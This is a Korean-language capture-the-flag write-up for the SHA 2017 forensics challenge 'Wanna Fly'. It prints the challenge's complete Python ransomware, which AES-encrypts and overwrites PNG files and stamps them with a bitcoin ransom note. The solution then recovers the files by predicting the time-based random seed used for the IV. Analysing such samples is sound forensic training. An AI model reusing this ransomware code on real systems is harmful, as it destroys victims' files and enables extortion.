# 2017 SHA - [FORENSIC] Wanna Fly

## Key words

- mount image
- ransomeware
- predict random seed

## Solution

문제에 ext4 파일 시스템 이미지 파일이 제공됩니다.

먼저 이를 마운트 시켜서 폴더 내용을 조사해 봅니다.

```
$sudo mount -o loop kimberly.img ./mounted
```

첫 번째로 `.bash_history`가 존재 하는데 이를 보면 다음과 같습니다.

```
unset HISTFIL
ls -la
pwd
chmod +x ...
./... Hb8jnSKzaNQr5f7p
ls -Rla
```

`...` 이란 프로그램에 인자로 `Hb8jnSKzaNQr5f7p`을 넣었습니다.

두 번째로 `...` 이란 파일을 살펴 보면 다음과 같이 파이썬 코드임을 알 수 있습니다.

```python
#!/usr/bin/env python

import random, string, sys, os
from time import time
from Crypto.Cipher import AES
import base64
from PIL import Image
from PIL import ImageFont
from PIL import ImageDraw
from PIL import ImageFilter
import textwrap
from io import BytesIO

IMG="""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"""

MSG="""This Image is encrypted by WannaFly Ransom-ware. If you want your original image back, feel free to contact us on sha2017ctf@gmail.com and make a bitcoin payment of 0.1 bitcoin to address 1QCc1EYncxTeSfTKpaCZ2hvMDwXULKRVWe"""

def get_iv():
    iv = ""
    random.seed(int(time()))
    for i in range(0,16):
        iv += random.choice(string.letters + string.digits)
    return iv

def encrypt(m, p):
    iv=get_iv()
    aes = AES.new(p, AES.MODE_CFB, iv)
    return base64.b64encode(aes.encrypt(m))

def decrypt(m, p, i):
    aes = AES.new(p, AES.MODE_CFB, i)
    return aes.decrypt(base64.b64decode(m))

def find_images():
    i = []
    #for r, d, f in os.walk(os.environ['HOME']):
    for r, d, f in os.walk("."):
        for g in f:
            if g.endswith(".png"):
                i.append((os.path.join(r, g)))
    return i

def encrypt_images():
    for i in find_images():
        img = Image.open(i).filter(ImageFilter.GaussianBlur(radius=18))
        draw = ImageDraw.Draw(img)
        font = ImageFont.truetype("/usr/share/fonts/truetype/freefont/FreeSans.ttf", 18)
        text = textwrap.wrap(MSG, width=60)
        W, H = img.size
        bird = Image.open(BytesIO(base64.b64decode(IMG)))
        bw, bh = bird.size
        offset = ((W-bw)/2, (H-bh)/2 - 80)
        img.paste(bird, offset, bird)
        pad = 0
        for line in text:
            w, h = draw.textsize(line, font=font)
            draw.text(((W-w)/2, (H-h)/2 + pad), line, font=font, fill="white")
            pad += 20
        img.save('/tmp/sha.png')
    encrypt_image(i)

def encrypt_image(img):
    data = open(img, 'r').read()
    encrypted_img = encrypt(data, sys.argv[1])
    blurred_img = open('/tmp/sha.png', 'r').read()
    stat = os.stat(img)
    with open(img, 'r+') as of:
        of.write('\0' * stat.st_size)
        of.flush()
    open(img, 'w').write(blurred_img + "\n" + encrypted_img)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage: %s <pass>" % sys.argv[0]
    else:
        encrypt_images()
```

마지막으로 `Pictures` 폴더에 블러 효과가 입혀진 암호화된 파일들이 존재합니다.

```
tbkim@ubuntu:~/ctfing/2017_sha/forensic$ ls -al --time-style=full-iso ./mounted/Pictures/
total 29123
drwxrwxr-x  2 1001 1001    1024 2017-06-20 08:04:04.000000000 -0700 .
drwxr-xr-x 12 1001 1001    1024 2017-06-20 09:55:16.000000000 -0700 ..
-rw-r--r--  1 1001 1001 1040070 2017-06-20 09:14:40.000000000 -0700 78d14f37ae413511b119776c2294c414.png
-rw-r--r--  1 1001 1001 1747640 2017-06-20 09:14:42.000000000 -0700 8210680-Palomino-Shetland-pony-Equus-caballus-3-years-old-standing-in-front-of-white-background-Stock-Photo.png
-rw-r--r--  1 1001 1001 1262073 2017-06-20 09:14:42.000000000 -0700 8210722-Palomino-Shetland-pony-Equus-caballus-3-years-old-standing-in-front-of-white-background-Stock-Photo.png
-rw-r--r--  1 1001 1001 2194500 2017-06-20 09:14:38.000000000 -0700 bay_pony_cantering_2_by_tamacilo.png
-rw-r--r--  1 1001 1001 2144707 2017-06-20 09:14:41.000000000 -0700 bay_pony_rolling2_by_tamacilo.png
-rw-r--r--  1 1001 1001 1316679 2017-06-20 09:14:40.000000000 -0700 connemara_pony2_750.png
-rw-r--r--  1 1001 1001  645968 2017-06-20 09:14:41.000000000 -0700 dappled-pony.png
-rw-r--r--  1 1001 1001  947739 2017-06-20 09:14:41.000000000 -0700 f09086061f03f080d0851d9154e11653.png
-rw-r--r--  1 1001 1001 1564211 2017-06-20 09:14:41.000000000 -0700 Het-verschil-tussen-een-pony-en-een-shetland-pony.png
-rw-r--r--  1 1001 1001 1442577 2017-06-20 09:14:40.000000000 -0700 oli.png
-rw-r--r--  1 1001 1001  947331 2017-06-20 09:14:40.000000000 -0700 Peppermint-Pony.png
-rw-r--r--  1 1001 1001 3478821 2017-06-20 09:14:39.000000000 -0700 pony.png
-rw-r--r--  1 1001 1001 1916939 2017-06-20 09:14:38.000000000 -0700 pony_shutterstock_50279794.png
-rw-r--r--  1 1001 1001 1910486 2017-06-20 09:14:42.000000000 -0700 shetlander-pony.png
-rw-r--r--  1 1001 1001  832413 2017-06-20 09:14:39.000000000 -0700 shutterstock_146544482-680x400.png
-rw-r--r--  1 1001 1001 2111020 2017-06-20 09:14:40.000000000 -0700 white-pony-951772_960_720.png
-rw-r--r--  1 1001 1001 4308839 2017-06-20 09:14:39.000000000 -0700 Wild_Pony_Assateague.png

```

파이썬 코드를 보면 이 파일은 (수정된 이미지 + 암호화된 원본 데이터)로 구성되어 있음을 알 수 있습니다.

먼저 `.bash_history`를 통해 AES 암호의 키가 `Hb8jnSKzaNQr5f7p`임을 알았는데, 다음에 IV 값을 알아야 합니다.

문제는 IV의 값을 `random.seed(int(time()))`로 사용하여 현재 시간을 시드로 사용했는데 이는 생성된 (또는 수정된) 시간을 이용하여 동일한 시간으로 시드를 설정할 수 있기 때문에 암호화 시에 사용했던 IV 값을 동일하게 사용할 수 있습니다.

시간은 `2017년 6월 20일 9시 14분 38초 ~ 42초`로 구성되어 있는데 한 가지 삽질 했던 점은 시간 변환을 `GMT` 기준으로 해서 결과가 나오질 않았습니다. 

따라서 한 시간씩, 즉 +(60*60) 시드 값을 늘려 가면서 테스트해본 결과 +7시간에서 정확하게 복호화가 되었고, 파일들을 복호화 하다가 `f09086061f03f080d0851d9154e11653.png` 파일에서 플래그를 얻을 수 있었습니다.

## Solution Code

```python
from Crypto.Cipher import AES
import base64
import random, string

def get_iv():
    iv = ""
    random.seed(1497950081+60*60*7)
    for i in range(0,16):
        iv += random.choice(string.letters + string.digits)
    return iv

def decrypt(m, p, i):
    aes = AES.new(p, AES.MODE_CFB, i)
    return aes.decrypt(base64.b64decode(m))

k = "Hb8jnSKzaNQr5f7p"
target = "f09086061f03f080d0851d9154e11653.png"

data = open(target, "rb").read().split("IEND")[1:]
data[0] = data[0][5:]

c_data = data[0]
for i in range(1, len(data)):
    c_data += "IEND" + data[i]
data = decrypt(c_data, k, get_iv())

fd = open("flag.png","wb")
fd.write(data)
fd.close()
```

## Result

![](./flag.png)
